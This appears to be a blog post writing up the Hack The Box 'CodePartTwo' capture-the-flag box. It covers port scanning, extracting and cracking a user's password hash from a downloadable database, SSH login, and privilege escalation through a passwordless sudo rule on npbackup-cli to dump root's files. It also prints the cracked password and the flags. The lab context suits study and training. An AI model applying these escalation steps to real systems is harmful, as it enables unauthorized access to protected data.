---
layout: post
title: HTB-CodePartTwo
date: 2025-09-20
tags: [HTB]
category: [CTF-Writeups]
---

# HTB — CodePartTwo: Quick Writeup

**IP:** `10.10.11.82`  
**Difficulty:** Easy  
**Skills:** enumeration • database extraction • password cracking • SSH access • sudo misconfiguration

> **Summary:** Services on 22/8000/8080. A downloadable `users.db` from the web app contained a hash for user `marco`. The hash cracked to `sweetangelbabylove`, allowing SSH access as `marco` to capture the user flag. Root was obtained by abusing a NOPASSWD `sudo` entry for `/usr/local/bin/npbackup-cli` by modifying a backup config to point to `/root/` and using the tool to dump `root.txt`.

---

## Table of contents
1. [Recon (nmap)](#recon-nmap)  
2. [User: web & DB analysis](#user)  
3. [Root: privilege escalation (sudo misconfiguration)](#root)  
4. [Flags](#flags)  

---

## Recon (nmap)

**Command used**

```bash
nmap 10.10.11.82
```

**Result**

```bash
PORT     STATE SERVICE
22/tcp   open  ssh
8000/tcp open  http-alt
8080/tcp open  http-proxy
```

---

## User

### Steps
1. Open: `http://10.10.11.82:8080`  
2. Download `users.db` from the web application  
3. Inspect `users.db` and identify `marco` as a user with a stored password hash  
4. Crack the hash (e.g., using CrackStation or any hash lookup/cracking tool) — recovered password: `sweetangelbabylove`  
5. SSH in as `marco` and retrieve the user flag

### Example commands

SSH in:

```bash
ssh marco@10.10.11.82
# password: sweetangelbabylove
```

**User flag**

```bash
cat /home/marco/user.txt
# a70e5426127f3a9c24398209b6d60066
```

---

## Root

### Discovery
Check `sudo` privileges for `marco`:

```bash
sudo -l
```

Example output (relevant line):

```text
(ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```

This indicates `marco` can run `/usr/local/bin/npbackup-cli` via `sudo` without a password. `npbackup-cli` accepts a config file (`-c`) which specifies paths to back up/dump — if the config can be controlled, we can point it to `/root/root.txt` and use `--dump` to output the file.

### Exploit (steps)

1. Copy the shipped config so you can edit it:

```bash
cp /usr/local/bin/npbackup.conf ~/r.conf
```

2. Edit `r.conf` (example using `nano`):

```bash
nano ~/r.conf
# change path entries from /home/app/app/  to /root/
```

3. Run the backup/dump using sudo and the modified config:

```bash
sudo /usr/local/bin/npbackup-cli -c ~/r.conf -b

sudo /usr/local/bin/npbackup-cli -c ~/r.conf --dump /root/root.txt
# ff2b9fdc1181447222715708ed3e0454
```

---

## Flags

- **User:** `a70e5426127f3a9c24398209b6d60066`  
- **Root:** `ff2b9fdc1181447222715708ed3e0454`

---

*This writeup documents a CTF box and is for educational purposes only. Do not perform these actions against systems you do not own or have permission to test.*
